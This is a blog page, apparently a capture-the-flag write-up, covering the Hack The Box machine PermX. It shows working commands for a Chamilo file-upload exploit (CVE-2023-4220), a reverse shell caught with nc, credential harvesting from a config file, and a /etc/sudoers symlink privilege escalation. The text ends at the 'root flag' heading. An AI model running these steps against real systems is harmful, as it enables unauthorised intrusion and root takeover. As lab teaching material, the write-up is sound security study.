@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-TW" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/">
+  <link rel="icon" href="/">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xAL6">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="enumeration nmap 12345678910111213141516171819202122232425262728293031323334353637┌──(x㉿kali)-[~]└─$ sudo nmap -Pn -sV -sC -A 10.10.11.23                  Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox-PermX-Writeup">
+<meta property="og:url" content="http://example.com/2024/07/18/Hackthebox-PermX-Writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="enumeration nmap 12345678910111213141516171819202122232425262728293031323334353637┌──(x㉿kali)-[~]└─$ sudo nmap -Pn -sV -sC -A 10.10.11.23                  Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) a">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="http://example.com/2024/07/12/Hackthebox-Perfection-Writeup/.png">
+<meta property="og:image" content="http://example.com/2024/07/12/Hackthebox-Perfection-Writeup/.png">
+<meta property="og:image" content="http://example.com/2024/07/12/Hackthebox-Perfection-Writeup/-1.png">
+<meta property="article:published_time" content="2024-07-18T11:06:36.000Z">
+<meta property="article:modified_time" content="2024-07-18T15:47:07.045Z">
+<meta property="article:author" content="xAL6">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/07/12/Hackthebox-Perfection-Writeup/.png">
+  
+  
+  
+  <title>Hackthebox-PermX-Writeup - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xAL6&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首頁</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>歸檔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分類</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>標籤</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>關於</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/%E5%8A%8D%E4%BB%99.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hackthebox-PermX-Writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-18 19:06" pubdate>
+          2024年7月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分鐘
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hackthebox-PermX-Writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><hr>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -Pn -sV -sC -A 10.10.11.23                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 19:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> permx.htb (10.10.11.23)<br>Host is up (0.093s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)<br>|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.52<br>|_http-server-header: Apache/2.4.52 (Ubuntu)<br>|_http-title: eLEARNING<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=7/18%OT=22%CT=1%CU=44253%PV=Y%DS=2%DC=T%G=Y%TM=6698<br>OS:F8BB%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)<br>OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C<br>OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T<br>OS:4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+<br>OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y<br>OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%<br>OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br><br>Network Distance: 2 hops<br>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 256/tcp)<br>HOP RTT      ADDRESS<br>1   91.09 ms 10.10.14.1<br>2   91.17 ms permx.htb (10.10.11.23)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.06 seconds<br></code></pre></td></tr></table></figure>
+<p>開放端口：</p>
+<ul>
+<li>22&#x2F;tcp open  ssh     OpenSSH 8.9p1</li>
+<li>80&#x2F;tcp open  http    Apache httpd 2.4.52</li>
+</ul>
+<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><hr>
+<p>進入網頁重定向到permx.htb,故將permx.htb加到vhost<br><code>echo &#39;10.10.11.23    permx.htb&#39;|sudo tee -a /etc/hosts</code></p>
+<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="vhost-爆破"><a href="#vhost-爆破" class="headerlink" title="vhost 爆破"></a>vhost 爆破</h4><hr>
+<p>用wfuzz爆破vhost,發現很多都被重定向</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 404 -H <span class="hljs-string">&quot;Host: FUZZ.permx.htb&quot;</span> http://permx.htb<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://permx.htb/<br>Total requests: 114441<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload           <br>=====================================================================<br><br>000000003:   302        9 L      26 W       279 Ch      <span class="hljs-string">&quot;ftp&quot;</span>             <br>000000050:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;wiki&quot;</span>            <br>000000049:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;server&quot;</span>          <br>000000046:   302        9 L      26 W       279 Ch      <span class="hljs-string">&quot;img&quot;</span>             <br>000000007:   302        9 L      26 W       283 Ch      <span class="hljs-string">&quot;webdisk&quot;</span>         <br>000000015:   302        9 L      26 W       278 Ch      <span class="hljs-string">&quot;ns&quot;</span>              <br>000000047:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;news&quot;</span>            <br>000000048:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;portal&quot;</span>          <br>000000031:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;mobile&quot;</span>          <br>000000001:   200        586 L    2466 W     36182 Ch    <span class="hljs-string">&quot;www&quot;</span>             <br>000000039:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;dns2&quot;</span>            <br>000000042:   302        9 L      26 W       282 Ch      <span class="hljs-string">&quot;static&quot;</span>          <br>000000037:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;shop&quot;</span>            <br>000000044:   302        9 L      26 W       279 Ch      <span class="hljs-string">&quot;web&quot;</span>             <br>000000041:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;dns1&quot;</span>            <br>000000038:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;demo&quot;</span>            <br>000000045:   302        9 L      26 W       280 Ch      <span class="hljs-string">&quot;www1&quot;</span><br></code></pre></td></tr></table></figure>
+<p>於是用<code>--hc</code>選項將302的回應過濾掉</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 302,404 -H <span class="hljs-string">&quot;Host: FUZZ.permx.htb&quot;</span> http://permx.htb<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://permx.htb/<br>Total requests: 114441<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload           <br>=====================================================================<br><br>000000001:   200        586 L    2466 W     36182 Ch    <span class="hljs-string">&quot;www&quot;</span>             <br>000000477:   200        352 L    940 W      19347 Ch    <span class="hljs-string">&quot;lms&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>發現vhost <code>lms.permx.htb</code>於是<code>echo &#39;10.10.11.23    lms.permx.htb&#39;|sudo tee -a /etc/hosts</code></p>
+<p>進入網頁後發現是一個叫chamilo的cms系統</p>
+<p><img src="/2024/07/12/Hackthebox-Perfection-Writeup/-1.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><hr>
+<p>google <code>chamilo exploit</code>找到<a target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-4220/">CVE-2023-4220 PoC</a></p>
+<p>用pentestmonkey的<a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ curl -F <span class="hljs-string">&#x27;bigUploadFile=@php-reverse-shell.php&#x27;</span> <span class="hljs-string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span><br>The file has successfully been uploaded.                                                                                   <br>┌──(x㉿kali)-[~]<br>└─$ curl <span class="hljs-string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php&#x27;</span><br><br>┌──(x㉿kali)-[~]<br>└─$ nc -lvnp 1234<br>listening on [any] 1234 ...<br>connect to [10.10.14.53] from (UNKNOWN) [10.10.11.23] 50946<br>Linux permx 5.15.0-113-generic <span class="hljs-comment">#123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span><br> 11:34:01 up 1 day,  5:53,  0 <span class="hljs-built_in">users</span>,  load average: 0.01, 0.05, 0.02<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><hr>
+<p>查看本地端口,發現有mysql</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ss -tlp<br>State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess<br>LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*          <br>LISTEN 0      4096   127.0.0.53%lo:domain      0.0.0.0:*          <br>LISTEN 0      80         127.0.0.1:mysql       0.0.0.0:*          <br>LISTEN 0      511                *:http              *:*          <br>LISTEN 0      128             [::]:ssh            [::]:* <br></code></pre></td></tr></table></figure>
+<p>到configuration.php查看資料庫設定,取得密碼</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> /var/www/chamilo/app/config/configuration.php | egrep <span class="hljs-string">&#x27;db_user|db_password&#x27;</span><br><span class="hljs-variable">$_configuration</span>[<span class="hljs-string">&#x27;db_user&#x27;</span>] = <span class="hljs-string">&#x27;chamilo&#x27;</span>;<br><span class="hljs-variable">$_configuration</span>[<span class="hljs-string">&#x27;db_password&#x27;</span>] = <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>查看本地使用者,發現mtz</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br>tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false<br>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>mtz:x:1000:1000:mtz:/home/mtz:/bin/bash<br>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false<br></code></pre></td></tr></table></figure>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><hr>
+<h3 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(x㉿kali)-[~]<br>└─$ ssh mtz@10.10.11.23<br>mtz@permx:~$ <span class="hljs-built_in">cat</span> ~/user.txt<br>&lt;user flag&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>sudo -l</code> 發現<code>/opt/acl.sh</code>可以用<code>sudo</code>執行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> mtz on permx:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,<br>    use_pty<br><br>User mtz may run the following commands on permx:<br>    (ALL : ALL) NOPASSWD: /opt/acl.sh<br></code></pre></td></tr></table></figure>
+
+<p>這是一個可以用來設定檔案的權限的腳本,並且檔案路徑要以&#x2F;home&#x2F;mtz&#x2F;開頭,而且不能有<code>..</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">cat</span> /opt/acl.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -ne 3 ]; <span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Usage: <span class="hljs-variable">$0</span> user perm file&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>user=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>perm=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>target=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> != /home/mtz/* || <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> == *..* ]]; <span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Access denied.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Check if the path is a file</span><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Target must be a file.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>/usr/bin/sudo /usr/bin/setfacl -m u:<span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$perm</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$target</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="symbolic-link"><a href="#symbolic-link" class="headerlink" title="symbolic link"></a>symbolic link</h3><hr>
+<p>用<code>ln</code> 建立指向<code>/etc/sudoers</code>的連結以繞過限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">ln</span> -s /etc/sudoers /home/mtz/sudo<br><br>mtz@permx:~/.ssh$ <span class="hljs-built_in">sudo</span> /opt/acl.sh mtz rw /home/mtz/sudo<br></code></pre></td></tr></table></figure>
+
+<h3 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h3><hr>
